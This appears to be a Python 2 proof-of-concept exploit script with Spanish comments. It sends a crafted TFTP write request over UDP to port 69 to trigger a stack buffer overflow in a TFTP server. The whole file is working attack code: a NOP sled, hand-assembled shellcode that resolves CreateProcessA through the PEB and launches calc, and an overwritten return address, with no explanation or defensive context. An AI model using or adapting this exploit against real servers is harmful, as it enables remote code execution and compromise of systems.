import socket
import sys

host = '127.0.0.1'
port = 69

# creamos socket UDP
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

maxBuffer = 465


ppr  = "\x28\x33\x40\x00"   # pop esp; call esi

shellcode  = "\x31\xdb"                 # xor ebx, ebx     
shellcode += "\x64\x8b\x7b\x30"         # mov edi, dword ptr fs:[ebx+30]
shellcode += "\x8b\x7f\x0c"             # mov edi, dword ptr [edi+0xC]
shellcode += "\x8b\x7f\x1c"             # mov edi, dword ptr [edi+0x1C]
shellcode += "\x8b\x47\x08"             # mov eax, dword ptr [edi+0x8]
shellcode += "\x8b\x77\x20"             # mov esi, dword ptr [edi+0x20]
shellcode += "\x8b\x3f"                 # mov edi, dword ptr [edi]
shellcode += "\x80\x7e\x0c\x33"         # cmp byte ptr [esi+0xC], 0x33
shellcode += "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
shellcode += "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
shellcode += "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
shellcode += "\x45\x81\x3e\x43\x72\x65\x61\x75"
shellcode += "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
shellcode += "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
shellcode += "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
shellcode += "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
shellcode += "\x83\xC4\x40"
shellcode += "\xb1\x0B\x53\xe2\xfd"
shellcode += "\x83\xC4\x40"
shellcode += "\x68\x63\x61"
shellcode += "\x6c\x63\x89\xe2\x52\x52\x53\x53"
shellcode += "\x53\x53\x53\x53\x52\x53\xff\xd7"

fruta = "\x90" * (465 - len(shellcode))
fruta += shellcode
fruta += ppr

server_address = (host,port)
message = "\x00\x01 " + 'A' + "\x00" + "\x90" * len("netascii") + fruta + '\00'


        
print "[+] Enviando: %s" % (message)
sent = sock.sendto(message,server_address)



